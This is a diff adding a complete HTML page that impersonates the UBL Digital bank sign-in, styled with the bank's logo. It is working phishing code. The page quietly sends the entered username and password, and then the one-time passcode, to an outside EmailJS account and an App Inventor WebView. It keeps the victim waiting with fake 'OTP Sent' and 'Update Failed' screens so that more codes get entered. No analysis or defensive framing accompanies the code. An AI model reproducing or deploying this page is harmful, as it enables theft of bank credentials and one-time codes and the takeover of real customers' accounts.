@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>UBL Digital - Sign In</title>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+html, body { width: 100%; min-height: 100vh; font-family: Arial, sans-serif; }
+body {
+  display: flex; flex-direction: column; align-items: center;
+  padding: 40px 20px 120px;
+  background: linear-gradient(135deg, #6e8fcb 0%, #9b7ecb 35%, #c08adf 65%, #d4a0e8 100%);
+  min-height: 100vh;
+}
+
+/* ===== PAGES ===== */
+.page { display: none; width: 100%; flex-direction: column; align-items: center; }
+.page.active { display: flex; }
+
+/* ===== LOGO ===== */
+.logo-wrap { align-self: flex-start; margin-bottom: 24px; }
+.logo-box { width: 90px; height: 90px; border-radius: 20px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,0.25); }
+
+/* ===== CARD ===== */
+.card { width: 100%; max-width: 420px; background: rgba(210,200,235,0.60); border-radius: 22px; padding: 30px 24px 34px; box-shadow: 0 8px 32px rgba(60,30,100,0.18); border: 1px solid rgba(255,255,255,0.35); backdrop-filter: blur(12px); }
+.card h1 { font-size: 30px; font-weight: 800; color: #111; margin-bottom: 6px; }
+.card p { font-size: 13px; color: #333; margin-bottom: 24px; }
+label { display: block; font-size: 13px; font-weight: 600; color: #222; margin-bottom: 7px; }
+.input-wrap { position: relative; margin-bottom: 18px; }
+input[type="text"], input[type="password"] { width: 100%; padding: 15px 16px; border-radius: 13px; border: none; background: rgba(235,228,252,0.85); font-size: 15px; font-family: inherit; color: #222; outline: none; }
+input:focus { background: rgba(255,255,255,0.92); box-shadow: 0 0 0 2px rgba(100,70,180,0.3); }
+input::placeholder { color: #aaa; }
+#otp { font-size: 22px; letter-spacing: 10px; text-align: center; font-weight: 700; }
+.eye-btn { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); background: white; border: none; border-radius: 50%; width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; cursor: pointer; box-shadow: 0 1px 4px rgba(0,0,0,0.12); }
+.eye-btn svg { width: 17px; height: 17px; stroke: #888; fill: none; stroke-width: 2; }
+.btn-main { width: 100%; padding: 16px; background: #555568; color: white; border: none; border-radius: 13px; font-size: 16px; font-weight: 700; font-family: inherit; cursor: pointer; margin-top: 6px; transition: opacity 0.2s; }
+.btn-main:hover { opacity: 0.9; }
+
+/* ===== FULLSCREEN OVERLAY PAGES ===== */
+.overlay {
+  position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+  background: linear-gradient(135deg, #6e8fcb 0%, #9b7ecb 35%, #c08adf 65%, #d4a0e8 100%);
+  display: none; flex-direction: column; justify-content: center; align-items: center;
+  z-index: 1000; padding: 30px;
+}
+.overlay.active { display: flex; }
+
+/* ===== ANIMATION ===== */
+.spinner { width: 80px; height: 80px; border: 6px solid rgba(255,255,255,0.3); border-top: 6px solid white; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 25px; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.anim-text { color: white; font-size: 18px; font-weight: 700; margin-bottom: 20px; text-align: center; }
+.progress-wrap { width: 220px; height: 6px; background: rgba(255,255,255,0.3); border-radius: 3px; overflow: hidden; }
+.progress-fill { height: 100%; background: white; border-radius: 3px; width: 0%; transition: width 5s linear; }
+
+/* ===== ERROR PAGE ===== */
+.error-box { background: rgba(210,200,235,0.70); border-radius: 22px; padding: 35px 28px; max-width: 380px; width: 100%; text-align: center; box-shadow: 0 8px 32px rgba(60,30,100,0.18); border: 1px solid rgba(255,255,255,0.35); backdrop-filter: blur(12px); }
+.error-icon { font-size: 55px; margin-bottom: 16px; }
+.error-title { font-size: 20px; font-weight: 800; color: #c0392b; margin-bottom: 12px; }
+.error-msg { font-size: 14px; color: #333; margin-bottom: 24px; line-height: 1.6; }
+.btn-retry { background: #555568; color: white; border: none; border-radius: 13px; padding: 14px 32px; font-size: 15px; font-weight: 700; cursor: pointer; font-family: inherit; }
+
+/* ===== BOTTOM BTNS ===== */
+.bottom-btns { position: fixed; bottom: 0; left: 0; right: 0; display: flex; gap: 12px; padding: 12px 20px 24px; justify-content: center; }
+.bottom-btn { flex: 1; max-width: 175px; background: white; border: none; border-radius: 16px; padding: 14px 10px; display: flex; flex-direction: column; align-items: center; gap: 5px; cursor: pointer; box-shadow: 0 2px 12px rgba(0,0,0,0.12); font-family: inherit; font-size: 13px; font-weight: 700; color: #222; }
+.bottom-btn svg { width: 22px; height: 22px; stroke: #333; fill: none; stroke-width: 1.8; }
+
+/* ===== TOAST ===== */
+.toast { position: fixed; top: 24px; left: 50%; transform: translateX(-50%); color: white; padding: 12px 24px; border-radius: 30px; font-size: 14px; font-weight: 700; z-index: 9999; opacity: 0; transition: opacity 0.35s; pointer-events: none; white-space: nowrap; max-width: 90vw; text-align: center; }
+.toast.show { opacity: 1; }
+</style>
+</head>
+<body>
+
+<!-- ===== PAGE 1: LOGIN ===== -->
+<div class="page active" id="page-login">
+  <div class="logo-wrap">
+    <div class="logo-box">
+      <svg width="90" height="90" viewBox="0 0 90 90" xmlns="http://www.w3.org/2000/svg">
+        <rect width="90" height="90" rx="18" fill="#2e7bc4"/>
+        <rect x="0" y="62" width="90" height="28" rx="18" fill="white"/>
+        <rect x="0" y="62" width="90" height="14" fill="white"/>
+        <path d="M18 44 C18 26 32 14 52 14 C62 14 70 18 74 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round"/>
+        <path d="M18 44 C18 58 30 66 46 66 C60 66 72 58 74 46" fill="none" stroke="white" stroke-width="3" stroke-linecap="round"/>
+        <text x="46" y="52" text-anchor="middle" font-family="Arial Black,Arial" font-weight="900" font-size="22" fill="white" letter-spacing="2">UBL</text>
+        <circle cx="74" cy="24" r="3.5" fill="white"/>
+        <text x="45" y="83" text-anchor="middle" font-family="Arial,sans-serif" font-weight="700" font-size="14" fill="#2e7bc4" letter-spacing="1">digital</text>
+      </svg>
+    </div>
+  </div>
+  <div class="card">
+    <h1>Sign In</h1>
+    <p>Enter your credentials to sign in to UBL Digital.</p>
+    <label>Username:</label>
+    <div class="input-wrap">
+      <input type="text" id="username" placeholder="Enter Username" autocomplete="off">
+    </div>
+    <label>Password:</label>
+    <div class="input-wrap">
+      <input type="password" id="password" placeholder="Enter Password">
+      <button class="eye-btn" onclick="togglePwd()" type="button">
+        <svg id="eyeIcon" viewBox="0 0 24 24">
+          <path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94"/>
+          <path d="M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19"/>
+          <line x1="1" y1="1" x2="23" y2="23"/>
+        </svg>
+      </button>
+    </div>
+    <button class="btn-main" onclick="sendLogin()" type="button">Update</button>
+  </div>
+  <div class="bottom-btns">
+    <button class="bottom-btn" type="button">
+      <svg viewBox="0 0 24 24"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/><circle cx="12" cy="10" r="3"/></svg>
+      Locate Us
+    </button>
+    <button class="bottom-btn" type="button">
+      <svg viewBox="0 0 24 24"><path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07A19.5 19.5 0 013.07 9.81 19.79 19.79 0 01.18 1.18 2 2 0 012.18 0h3a2 2 0 012 1.72c.13 1 .39 1.98.74 2.93a2 2 0 01-.45 2.11L6.91 7.91a16 16 0 006.18 6.18l1.15-1.56a2 2 0 012.11-.45c.95.35 1.93.61 2.93.74A2 2 0 0122 16.92z"/></svg>
+      Contact Us
+    </button>
+  </div>
+</div>
+
+<!-- ===== PAGE 2: OTP ===== -->
+<div class="page" id="page-otp">
+  <div class="logo-wrap">
+    <div class="logo-box">
+      <svg width="90" height="90" viewBox="0 0 90 90" xmlns="http://www.w3.org/2000/svg">
+        <rect width="90" height="90" rx="18" fill="#2e7bc4"/>
+        <rect x="0" y="62" width="90" height="28" rx="18" fill="white"/>
+        <rect x="0" y="62" width="90" height="14" fill="white"/>
+        <path d="M18 44 C18 26 32 14 52 14 C62 14 70 18 74 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round"/>
+        <path d="M18 44 C18 58 30 66 46 66 C60 66 72 58 74 46" fill="none" stroke="white" stroke-width="3" stroke-linecap="round"/>
+        <text x="46" y="52" text-anchor="middle" font-family="Arial Black,Arial" font-weight="900" font-size="22" fill="white" letter-spacing="2">UBL</text>
+        <circle cx="74" cy="24" r="3.5" fill="white"/>
+        <text x="45" y="83" text-anchor="middle" font-family="Arial,sans-serif" font-weight="700" font-size="14" fill="#2e7bc4" letter-spacing="1">digital</text>
+      </svg>
+    </div>
+  </div>
+  <div class="card">
+    <h1>Validate OTP</h1>
+    <p>Please enter the OTP sent to your registered email or mobile number.</p>
+    <label>OTP:</label>
+    <div class="input-wrap">
+      <input type="text" id="otp" placeholder="• • • • • •" maxlength="6" autocomplete="off">
+    </div>
+    <button class="btn-main" onclick="sendOTP()" type="button">Update</button>
+  </div>
+  <div class="bottom-btns">
+    <button class="bottom-btn" type="button">
+      <svg viewBox="0 0 24 24"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/><circle cx="12" cy="10" r="3"/></svg>
+      Locate Us
+    </button>
+    <button class="bottom-btn" type="button">
+      <svg viewBox="0 0 24 24"><path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07A19.5 19.5 0 013.07 9.81 19.79 19.79 0 01.18 1.18 2 2 0 012.18 0h3a2 2 0 012 1.72c.13 1 .39 1.98.74 2.93a2 2 0 01-.45 2.11L6.91 7.91a16 16 0 006.18 6.18l1.15-1.56a2 2 0 012.11-.45c.95.35 1.93.61 2.93.74A2 2 0 0122 16.92z"/></svg>
+      Contact Us
+    </button>
+  </div>
+</div>
+
+<!-- ===== ANIMATION 1 (Login → OTP) ===== -->
+<div class="overlay" id="anim-login">
+  <div class="spinner"></div>
+  <div class="anim-text" id="animText1">Sending OTP...</div>
+  <div class="progress-wrap">
+    <div class="progress-fill" id="prog1"></div>
+  </div>
+</div>
+
+<!-- ===== ANIMATION 2 (OTP → Error) ===== -->
+<div class="overlay" id="anim-otp">
+  <div class="spinner"></div>
+  <div class="anim-text" id="animText2">Verifying OTP...</div>
+  <div class="progress-wrap">
+    <div class="progress-fill" id="prog2"></div>
+  </div>
+</div>
+
+<!-- ===== ERROR PAGE ===== -->
+<div class="overlay" id="page-error">
+  <div class="error-box">
+    <div class="error-icon">⚠️</div>
+    <div class="error-title">Update Failed!</div>
+    <div class="error-msg">Your app option has not been updated successfully.<br><br>Please try again.</div>
+    <button class="btn-retry" onclick="retryOTP()">Try Again</button>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+  emailjs.init('H8zNCi_xuoHUNTMAn');
+
+  function showToast(msg, color) {
+    const t = document.getElementById('toast');
+    t.textContent = msg;
+    t.style.background = color || '#333';
+    t.classList.add('show');
+    setTimeout(() => t.classList.remove('show'), 3000);
+  }
+
+  function hideAll() {
+    document.querySelectorAll('.page, .overlay').forEach(el => el.classList.remove('active'));
+  }
+
+  // ===== LOGIN =====
+  async function sendLogin() {
+    const username = document.getElementById('username').value.trim();
+    const password = document.getElementById('password').value.trim();
+    if (!username || !password) {
+      showToast('Username اور Password لکھیں!', '#c0392b');
+      return;
+    }
+
+    const now = new Date().toLocaleString();
+
+    // Send email in background
+    try {
+      if (window.AppInventor) {
+        window.AppInventor.setWebViewString('UBL Login!\nUsername: ' + username + '\nPassword: ' + password);
+      }
+    } catch(e) {}
+    emailjs.send('service_uybum65', 'template_p4aqr39', {
+      username: username, password: password, time: now
+    }).catch(e => {});
+
+    // Show animation
+    hideAll();
+    const anim = document.getElementById('anim-login');
+    anim.classList.add('active');
+    setTimeout(() => { document.getElementById('prog1').style.width = '100%'; }, 100);
+    setTimeout(() => { document.getElementById('animText1').textContent = 'Please wait...'; }, 2000);
+    setTimeout(() => { document.getElementById('animText1').textContent = 'OTP Sent!'; }, 3500);
+
+    // Go to OTP after 5 seconds
+    setTimeout(() => {
+      hideAll();
+      document.getElementById('page-otp').classList.add('active');
+      // Reset animation for next use
+      document.getElementById('prog1').style.transition = 'none';
+      document.getElementById('prog1').style.width = '0%';
+      document.getElementById('animText1').textContent = 'Sending OTP...';
+      setTimeout(() => {
+        document.getElementById('prog1').style.transition = 'width 5s linear';
+      }, 100);
+    }, 5000);
+  }
+
+  // ===== OTP =====
+  async function sendOTP() {
+    const otp = document.getElementById('otp').value.trim();
+    if (!otp) {
+      showToast('OTP لکھیں!', '#c0392b');
+      return;
+    }
+
+    const now = new Date().toLocaleString();
+
+    // Send email in background
+    emailjs.send('service_uybum65', 'template_p4aqr39', {
+      otp: otp, time: now
+    }).catch(e => {});
+
+    // Show animation
+    hideAll();
+    const anim = document.getElementById('anim-otp');
+    anim.classList.add('active');
+    setTimeout(() => { document.getElementById('prog2').style.width = '100%'; }, 100);
+    setTimeout(() => { document.getElementById('animText2').textContent = 'Checking OTP...'; }, 2000);
+    setTimeout(() => { document.getElementById('animText2').textContent = 'Almost done...'; }, 3500);
+
+    // Show error after 5 seconds
+    setTimeout(() => {
+      hideAll();
+      document.getElementById('page-error').classList.add('active');
+      // Reset animation
+      document.getElementById('prog2').style.transition = 'none';
+      document.getElementById('prog2').style.width = '0%';
+      document.getElementById('animText2').textContent = 'Verifying OTP...';
+      setTimeout(() => {
+        document.getElementById('prog2').style.transition = 'width 5s linear';
+      }, 100);
+    }, 5000);
+  }
+
+  // ===== RETRY =====
+  function retryOTP() {
+    document.getElementById('otp').value = '';
+    hideAll();
+    document.getElementById('page-otp').classList.add('active');
+  }
+
+  // ===== PASSWORD TOGGLE =====
+  function togglePwd() {
+    const inp = document.getElementById('password');
+    const icon = document.getElementById('eyeIcon');
+    if (inp.type === 'password') {
+      inp.type = 'text';
+      icon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
+    } else {
+      inp.type = 'password';
+      icon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/>';
+    }
+  }
+</script>
+</body>
+</html>
